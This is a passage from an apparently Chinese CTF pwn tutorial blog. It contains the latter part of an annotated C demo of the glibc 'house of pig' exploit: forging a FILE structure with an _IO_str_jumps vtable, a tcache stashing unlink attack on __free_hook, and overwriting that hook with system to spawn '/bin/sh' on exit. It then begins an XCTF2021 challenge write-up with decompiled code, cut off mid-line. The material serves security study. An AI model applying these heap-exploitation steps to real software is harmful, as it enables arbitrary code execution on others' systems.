class="string">&quot;注意红色部分的代码，这便是遍历_IO_list_all链中的所有FILE实例。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其中一条if语句的判断条件中会调用_IO_OVERFLOW函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这个函数指的是vtable中overflow那个字段对应的函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;要执行到这个函数，就必须要让前面一个判断条件满足。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这也就是我们伪造FILE结构体时需要注意的地方。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面我们就来修改_IO_list_all的值，用一个chunk地址填充。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> chunk_2 = (<span class="type">size_t</span>) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>) - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// ---------- 第二处漏洞利用 ---------- //</span></span><br><span class="line">    *_IO_list_all = chunk_2;</span><br><span class="line">    <span class="comment">// --------------------------------- //</span></span><br><span class="line">    <span class="built_in">printf_color</span>(YELLOW, HIGHLIGHT, <span class="string">&quot;这个chunk的起始地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[&quot;</span> HIGHLIGHT <span class="string">&quot;;&quot;</span> YELLOW <span class="string">&quot;m%#zx\n&quot;</span> STR_END, chunk_2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第四步：伪造FILE结构体。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;我们使用第二次分配到的chunk作为假FILE结构体进行构造。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;再次强调注意_IO_flush_all_lockp函数的限定条件。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;if语句的前一个判断条件是两个判断相或，我们只需要满足第一个判断即可：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其中_mode字段的偏移为0xC0，_IO_write_ptr为0x28，_IO_write_base为0x30。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;我们在_mode处填0，在_IO_write_ptr填1，在_IO_write_base填0就可以了。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span>* fake_FILE = (<span class="type">size_t</span>*) chunk_2;</span><br><span class="line">    fake_FILE[<span class="number">0xC0</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _mode</span></span><br><span class="line">    fake_FILE[<span class="number">0x20</span> / <span class="number">8</span>] = <span class="number">1</span>;</span><br><span class="line">    fake_FILE[<span class="number">0x28</span> / <span class="number">8</span>] = <span class="number">0xFFFFFFFFFFFF</span>;    <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_FILE[<span class="number">0x30</span> / <span class="number">8</span>] = <span class="number">0</span>;    <span class="comment">// _IO_write_base</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;三个字段修改完成。但我们需要修改的可不止这三个字段。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在这个判断条件通过后，我们将会进入overflow函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig的一个重要思想就是让其执行_IO_str_overflow函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这需要我们在vtable中写入_IO_str_jumps的地址，其中保存有这个函数的地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;看一下IDA中的_IO_str_jumps结构体：\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560 qword_1E9560    dq 0                    ; DATA XREF: sub_52C20+49A↑o\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560                                         ; sscanf+B5↑o ...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9568                 dq 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9570                 dq offset sub_93D50\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m__libc_IO_vtables:00000000001E9578                 dq offset _IO_str_overflow\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9580                 dq offset _IO_str_underflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9588                 dq offset _IO_default_uflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9590                 dq offset _IO_str_pbackfail\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9598                 dq offset _IO_default_xsputn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A0                 dq offset _IO_default_xsgetn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A8                 dq offset _IO_str_seekoff\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B0                 dq offset sub_92600\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B8                 dq offset sub_924E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C0                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C8                 dq offset _IO_default_doallocate\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D0                 dq offset sub_937F0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D8                 dq offset sub_93800\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E0                 dq offset sub_937D0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E8                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F0                 dq offset sub_937E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F8                 dq offset sub_93810\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9600                 dq offset sub_93820\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其偏移为0x1E9560。将其填充到vtable字段，偏移为0xD8。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> _IO_str_jumps = libc_base + <span class="number">0x1E9560</span>;</span><br><span class="line">    fake_FILE[<span class="number">0xD8</span> / <span class="number">8</span>] = _IO_str_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后，我们进入_IO_str_overflow函数看看。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/strops.c, line 80)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_str_overflow (FILE *fp, int c)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int flush_only = c == EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  size_t pos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return flush_only ? 0 : EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m\t  char *new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  char *old_buf = fp-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t old_blen = _IO_blen (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t new_size = 2 * old_blen + 100;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_size &lt; old_blen)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  new_buf = malloc (new_size);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_buf == NULL)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /*\t  __ferror(fp) = 1; */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (old_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      memcpy (new_buf, old_buf, old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      free (old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_IO_buf_base = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  memset (new_buf + old_blen, &#x27;\\0&#x27;, new_size - old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  _IO_setb (fp, new_buf, new_buf + new_size, 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_base = new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (!flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，这里会连续调用malloc、memcpy、free函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig想要在这里大做文章。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先需要通过tcache stashing unlink attack或其他方法向tcache中插入__free_hook附近的地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后在运行到此时，首先通过malloc分配出来，然后memcpy将指定位置的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;最后通过free函数执行__free_hook中的内容，这里将__free_hook修改为system函数地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;通过代码我们可以知道，memcpy是将_IO_buf_base（结构体内偏移0x38）地址处的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;而这个复制的原地址是我们可控的，需要我们在伪造的FILE结构体中设置。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这里我们设置这个地址的值为第一个chunk的地址+0x20。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x38</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。之后我们需要注意malloc函数申请的chunk大小，其申请的大小需要经过计算。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;计算方式是：(_IO_buf_end - _IO_buf_base) * 2 + 100。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这要求我们正确设置_IO_buf_end的值。如果使用0x100的tcache进行攻击，则end-base=0x46。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;据此设置_IO_buf_end为第一个chunk的地址+0x20+0x46（结构体内偏移0x40）。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x40</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span> + <span class="number">0x46</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。最后注意free函数的参数是FILE结构体的起始地址，因此在第二个chunk+0x20处写入\&quot;/bin/sh\\x00\&quot;。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;另外在第二个chunk+0x30处写入system函数地址，memcpy函数能够将这里的地址复制到__free_hook。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)(chunk_1 + <span class="number">0x20</span>), <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(chunk_1 + <span class="number">0x20</span> + <span class="number">0x10</span>) = (<span class="type">size_t</span>)system;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第五步：通过tcache stashing unlink attack在tcache写入__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;当赛题中只使用calloc时，只有在tcache中存放堆地址，才能让malloc分配到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面进行这种攻击的常规流程：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先分配9个chunk并释放，7个到tcache，2个到small bins。然后分配两个tcache chunk出来。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">7</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">8</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">9</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(chunks[i]);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;依次释放9个chunk，tcache中的chunk应该为：7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;unsorted bin中的chunk应该为：9&lt;-&gt;8。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后分配出来两个tcache chunk，再分配一个较大的chunk，让unsorted bin的两个chunk进入small bins。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;应该修改第9个chunk的bk指针为__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span>*)((<span class="type">size_t</span>)(chunks[<span class="number">8</span>]) + <span class="number">0x8</span>) = __free_hook - <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;修改完成，之后分配一个出来进行攻击。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;已经分配出来了一个chunk，现在0x100的tcache中的第一个chunk就是__free_hook附近的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第六步：调用exit函数触发house of pig漏洞。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;现在，所有的东西都已经布置好了，只需要一个exit函数，我们就能够执行预期的函数调用链并getshell。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="XCTF2021final-house-of-pig"><a href="#XCTF2021final-house-of-pig" class="headerlink" title="[XCTF2021final] house of pig"></a>[XCTF2021final] house of pig</h2><h4 id="检查信息-2"><a href="#检查信息-2" class="headerlink" title="检查信息"></a>检查信息</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028104920747.png"
                      alt="image-20231028104920747"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028104935630.png"
                      alt="image-20231028104935630"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028105055649.png"
                      alt="image-20231028105055649"
                ></p>
<p>没找到原 <code>libc</code>，这里使用如上 <code>libc</code> 。</p>
<h4 id="试运行-3"><a href="#试运行-3" class="headerlink" title="试运行"></a>试运行</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028105250592.png"
                      alt="image-20231028105250592"
                ></p>
<h4 id="逆向分析-4"><a href="#逆向分析-4" class="headerlink" title="逆向分析"></a>逆向分析</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> id; <span class="comment">// [rsp+0h] [rbp-420h]</span></span><br><span class="line">  <span class="type">int</span> new_id; <span class="comment">// [rsp+4h] [rbp-41Ch]</span></span><br><span class="line">  Info *info; <span class="comment">// [rsp+8h] [rbp-418h]</span></span><br><span class="line">  Info info1; <span class="comment">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class="line">  Info info2; <span class="comment">// [rsp+160h] [rbp-2C0h] BYREF</span></span><br><span class="line">  Info info3; <span class="comment">// [rsp+2B0h] [rbp-170h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+408h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">init_state</span>();</span><br><span class="line">  <span class="built_in">welcome</span>();</span><br><span class="line">  <span class="built_in">init_info1</span>(&amp;info1);</span><br><span class="line">  <span class="built_in">init_info2</span>(&amp;info2);</span><br><span class="line">  <span class="built_in">init_info3</span>(&amp;info3);</span><br><span class="line">  id = <span class="number">1</span>;</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Peppa Pig first~&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  info = &amp;info1;</span><br><span class="line">  <span class="built_in">get_info1</span>(&amp;info1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="built_in">get_num</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">add</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">show</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">edit</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">delete</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        new_id = <span class="built_in">login</span>();</span><br><span class="line">        <span class="keyword">if</span> ( new_id &amp;&amp; new_id != id )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> ( id )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="built_in">set_info1</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">set_info2</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              <span class="built_in">set_info3</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          id = new_id;</span><br><span class="line">          <span class="keyword">switch</span> ( new_id )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Peppa Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info1;</span><br><span class="line">              <span class="built_in">get_info1</span>(&amp;info1);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Mummy Pig~&quot;</span>);</span><br><span 